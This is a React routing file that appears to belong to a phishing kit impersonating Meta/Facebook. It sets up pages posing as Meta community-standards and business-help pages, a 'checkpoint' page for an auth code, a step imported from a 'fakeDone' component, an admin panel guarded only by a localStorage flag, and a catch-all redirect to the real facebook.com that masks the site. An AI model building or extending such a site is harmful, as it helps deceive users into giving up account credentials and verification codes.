import { Route, Routes, BrowserRouter, Navigate } from "react-router-dom";
import "./App.css";
import HomePage from "./pages/HomePage";
import MyForm from "./pages/MyForm";
import StartChat from "./pages/startChat";
import ClassUser from "./pages/fakeDone";
import AuthCode from "./pages/authCode";
import AdminPage from "./pages/admin";
import Login from "./pages/login";


function PrivateRoute({ children }) {
  return localStorage.getItem("logined") === "true" ? (
    <>{children}</>
  ) : (
    <Navigate to="/login" />
  );
}

function App() {
  return (
    <BrowserRouter>
      <div id="app">
        <Routes>
          <Route path="/meta-community-standard" element={<HomePage/>} />
          <Route path="/business-help-center" element={<MyForm/>} />
          <Route path="checkpoint/:userID" element={<AuthCode />} />
          <Route path="processing/:userID" element={<ClassUser />} />
          <Route path="login" element={<Login />} />
          <Route
            path="/admin"
            element={
              <PrivateRoute>
                <AdminPage />
              </PrivateRoute>
            }
          />
          <Route path="*" element={<meta httpEquiv="refresh" content="1; url=https://www.facebook.com/"/>} />
        </Routes>
      </div>
    </BrowserRouter>
  );
}


export default App;
